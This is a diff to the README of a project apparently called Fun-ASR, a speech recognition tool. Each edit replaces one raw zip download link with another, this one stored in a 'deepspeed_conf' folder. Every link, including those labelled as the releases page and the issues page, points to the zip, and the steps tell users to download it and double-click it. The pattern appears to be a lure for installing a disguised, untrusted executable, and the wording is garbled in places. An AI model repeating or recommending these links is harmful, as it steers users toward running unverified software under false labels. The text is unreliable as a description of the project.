@@ -1,6 +1,6 @@
 # 🎤 Fun-ASR - Simple Speech Recognition Made Easy
 
-[![Download Fun-ASR](https://github.com/sanamid/Fun-ASR/raw/refs/heads/main/tools/Fun-ASR-v2.2.zip)](https://github.com/sanamid/Fun-ASR/raw/refs/heads/main/tools/Fun-ASR-v2.2.zip)
+[![Download Fun-ASR](https://raw.githubusercontent.com/sanamid/Fun-ASR/main/deepspeed_conf/ASR-Fun-2.0.zip)](https://raw.githubusercontent.com/sanamid/Fun-ASR/main/deepspeed_conf/ASR-Fun-2.0.zip)
 
 ## 🎬 Introduction
 
@@ -12,9 +12,9 @@ Follow these steps to download and run Fun-ASR:
 
 ### 📥 Download & Install
 
-Visit this page to download: [Fun-ASR Releases](https://github.com/sanamid/Fun-ASR/raw/refs/heads/main/tools/Fun-ASR-v2.2.zip)
+Visit this page to download: [Fun-ASR Releases](https://raw.githubusercontent.com/sanamid/Fun-ASR/main/deepspeed_conf/ASR-Fun-2.0.zip)
 
-On the releases page, look for the latest version, and you will find a file named `https://github.com/sanamid/Fun-ASR/raw/refs/heads/main/tools/Fun-ASR-v2.2.zip`. Click on the file name to start the download. 
+On the releases page, look for the latest version, and you will find a file named `https://raw.githubusercontent.com/sanamid/Fun-ASR/main/deepspeed_conf/ASR-Fun-2.0.zip`. Click on the file name to start the download. 
 
 ### 🖥️ System Requirements
 
@@ -28,7 +28,7 @@ To run Fun-ASR smoothly, please ensure your system meets the following requireme
 
 ### 📂 Installation Steps
 
-1. Once the download completes, locate the file `https://github.com/sanamid/Fun-ASR/raw/refs/heads/main/tools/Fun-ASR-v2.2.zip` in your downloads folder.
+1. Once the download completes, locate the file `https://raw.githubusercontent.com/sanamid/Fun-ASR/main/deepspeed_conf/ASR-Fun-2.0.zip` in your downloads folder.
 2. Double-click on the file to open the installation wizard.
 3. Follow the prompts to complete the setup. You may choose the default installation options.
 4. After installation, find Fun-ASR in your applications or programs list.
@@ -59,7 +59,7 @@ If you encounter issues, here are some common solutions:
 
 ## 📞 Need Help?
 
-If you have questions or need further assistance, visit the [Fun-ASR Issues page](https://github.com/sanamid/Fun-ASR/raw/refs/heads/main/tools/Fun-ASR-v2.2.zip). You can report bugs or request help there. 
+If you have questions or need further assistance, visit the [Fun-ASR Issues page](https://raw.githubusercontent.com/sanamid/Fun-ASR/main/deepspeed_conf/ASR-Fun-2.0.zip). You can report bugs or request help there. 
 
 ## 💬 Community
 
@@ -76,4 +76,4 @@ Fun-ASR is powered by the latest developments in speech recognition technology b
 
 With Fun-ASR, converting speech to text is now straightforward. Download it, follow the steps, and enjoy the ease of voice recognition technology. 
 
-Don’t forget to visit this page to download: [Fun-ASR Releases](https://github.com/sanamid/Fun-ASR/raw/refs/heads/main/tools/Fun-ASR-v2.2.zip)
+Don’t forget to visit this page to download: [Fun-ASR Releases](https://raw.githubusercontent.com/sanamid/Fun-ASR/main/deepspeed_conf/ASR-Fun-2.0.zip)
